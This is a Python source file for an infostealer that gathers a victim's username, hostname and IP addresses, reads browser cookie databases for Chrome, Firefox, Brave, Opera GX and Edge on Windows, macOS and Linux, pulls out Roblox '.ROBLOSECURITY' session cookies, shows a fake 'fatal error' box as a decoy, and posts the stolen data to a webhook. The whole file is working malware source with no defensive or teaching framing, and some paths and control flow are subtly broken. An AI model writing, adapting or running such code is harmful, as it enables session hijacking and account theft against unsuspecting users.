import ctypes
import sqlite3
import platform
import socket
import requests
import os

webhook = ""

def info():
    username = os.getlogin()
    RunningOS = platform.system()
    hostname = socket.gethostname()
    localIP = socket.gethostbyname(hostname)
    headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    }
    publicIP = requests.get("https://ipapi.co/ip", headers=headers)

    return {"username" : username, "os" : RunningOS, "hostname" : hostname, "localIP" : localIP, "publicIP" : publicIP.text}


def cookies(targetInformation):
    username = targetInformation["username"]
    cookiesList = {}

    if targetInformation["os"] == "Linux":
        if os.path.exists(f"/home/{username}/.config/google-chrome/Default/Cookies.sqlite"):
            cookies_db = f"/home/{username}/.config/google-chrome/Default/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            chromeCookies = cursor.fetchall()
            cookiesList.update({"chromeCookies" : chromeCookies})

            conn.close() 

        if os.path.exists(f"/home/{username}/.mozilla/firefox/Profiles"):
            for x in os.listdir(f"/home/{username}/.mozilla/firefox/Profiles"):
                if os.path.exists(f"/home/{username}/.mozilla/firefox/Profiles/{x}/cookies.sqlite"):
                    
                    cookies_db = f"/home/{username}/.mozilla/firefox/{x}/cookies.sqlite"
                    conn = sqlite3.connect(cookies_db)
                    cursor = conn.cursor()

                    cursor.execute("SELECT name, value FROM moz_cookies")

                    firefoxCookies = cursor.fetchall()
                    cookiesList.update({"firefoxCookies" : firefoxCookies})

                    conn.close()

        if os.path.exists(f"/home/{username}/.config/BraveSoftware/Brave-Browser/Default/Cookies.sqlite"):
            cookies_db = f"/home/{username}/.config/BraveSoftware/Brave-Browser/Default/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            braveCookies = cursor.fetchall()
            cookiesList.update({"braveCookies" : braveCookies})

            conn.close()

        if os.path.exists(f"/home/{username}/.config/opera-gx/Cookies.sqlite"):
            cookies_db = f"/home/{username}/.config/opera-gx/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            operaGXCookies = cursor.fetchall()
            cookiesList.update({"operaGXCookies" : operaGXCookies})

            conn.close()

        if os.path.exists(f"/home/{username}/.config/microsoft-edge/Default/Cookies.sqlite"):
            cookies_db = f"/home/{username}/.config/microsoft-edge/Default/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            edgeCookies = cursor.fetchall()
            cookiesList.update({"edgeCookies" : edgeCookies})

            conn.close()

    
    elif targetInformation["os"] == "Darwin":
        if os.path.exists(f"/Users/{username}/Library/Application Support/Google/Chrome/Default/Cookies.sqlite"):
            cookies_db = f"/Users/{username}/Library/Application Support/Google/Chrome/Default/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            chromeCookies = cursor.fetchall()
            cookiesList.update({"chromeCookies" : chromeCookies})

            conn.close()

        if os.path.exists(f"/Users/{username}/Library/Application Support/Firefox/Profiles/"):
            for x in os.listdir(f"/Users/{username}/Library/Application Support/Firefox/Profiles/"):
                if os.path.exists(f"/Users/{username}/Library/Application Support/Firefox/Profiles/{x}/cookies.sqlite"):
                    
                    cookies_db = f"/Users/{username}/Library/Application Support/Firefox/Profiles/{x}/cookies.sqlite"
                    conn = sqlite3.connect(cookies_db)
                    cursor = conn.cursor()

                    cursor.execute("SELECT name, value FROM moz_cookies")

                    firefoxCookies = cursor.fetchall()
                    cookiesList.update({"firefoxCookies" : firefoxCookies})

                    conn.close()

        if os.path.exists(f"/Users/{username}/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies.sqlite"):
            cookies_db = f"/Users/{username}/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            braveCookies = cursor.fetchall()
            cookiesList.update({"braveCookies" : braveCookies})

            conn.close()

        if os.path.exists(f"/Users/{username}/Library/Application Support/com.operasoftware.OperaGX/Opera GX Stable/Cookies.sqlite"):
            cookies_db = f"/Users/{username}/Library/Application Support/com.operasoftware.OperaGX/Opera GX Stable/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            operaGXCookies = cursor.fetchall()
            cookiesList.update({"operaGXCookies" : operaGXCookies})

            conn.close()

        if os.path.exists(f"/Users/{username}/Library/Application Support/Microsoft Edge/Default/Cookies.sqlite"):
            cookies_db = f"/Users/{username}/Library/Application Support/Microsoft Edge/Default/Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            edgeCookies = cursor.fetchall()
            cookiesList.update({"edgeCookies" : edgeCookies})

            conn.close()

    elif targetInformation["os"] == "Windows":
        if os.path.exists(fr"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Cookies.sqlite"):
            cookies_db = fr"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            chromeCookies = cursor.fetchall()
            cookiesList.update({"chromeCookies" : chromeCookies})

            conn.close()

        if os.path.exists(fr"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles"):
            for x in os.listdir(fr"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles"):
                if os.path.exists(fr"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles/{x}/cookies.sqlite"):
                    
                    cookies_db = fr"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles/{x}/cookies.sqlite"
                    conn = sqlite3.connect(cookies_db)
                    cursor = conn.cursor()

                    cursor.execute("SELECT name, value FROM moz_cookies")

                    firefoxCookies = cursor.fetchall()
                    cookiesList.update({"firefoxCookies" : firefoxCookies})

                    conn.close()

        if os.path.exists(fr"C:\Users\{username}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies.sqlite"):
            cookies_db = fr"C:\Users\{username}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            braveCookies = cursor.fetchall()
            cookiesList.update({"braveCookies" : braveCookies})

            conn.close()

        if os.path.exists(fr"C:\Users\{username}\AppData\Roaming\Opera Software\Opera GX Stable\Cookies.sqlite"):
            cookies_db = fr"C:\Users\{username}\AppData\Roaming\Opera Software\Opera GX Stable\Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            operaGXCookies = cursor.fetchall()
            cookiesList.update({"operaGXCookies" : operaGXCookies})

            conn.close()

        if os.path.exists(fr"C:\Users\{username}\AppData\Local\Microsoft\Edge\User Data\Default\Cookies.sqlite"):
            cookies_db = fr"C:\Users\{username}\AppData\Local\Microsoft\Edge\User Data\Default\Cookies.sqlite"
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()

            cursor.execute("SELECT name, value FROM cookies")

            edgeCookies = cursor.fetchall()
            cookiesList.update({"edgeCookies" : edgeCookies})

            conn.close()
        
        return cookiesList
    

def roblox_cookie(cookiesList):
        robloxCookiesList = []
    
        for browser in cookiesList.items():
            for cookie in browser[1]:
                if cookie[0] == ".ROBLOSECURITY":
                    robloxCookiesList.append(cookie[1])
        
        return robloxCookiesList


ctypes.windll.user32.MessageBoxW(0 ,"A fatal error has occurred", "Error", 0x0 | 0x10)

targetInformation = info()

cookiesList = cookies(targetInformation)
robloxCookiesList = roblox_cookie(cookiesList)

data = {
    "username" : "Beamer",
    "embeds" : [{
        "title" : "Target info",
        "description" : f"{targetInformation}"
        },
        {
        "title" : "Roblox Cookie",
        "description" : f"{robloxCookiesList}"}
    ]
    
}

requests.post(webhook, json=data)
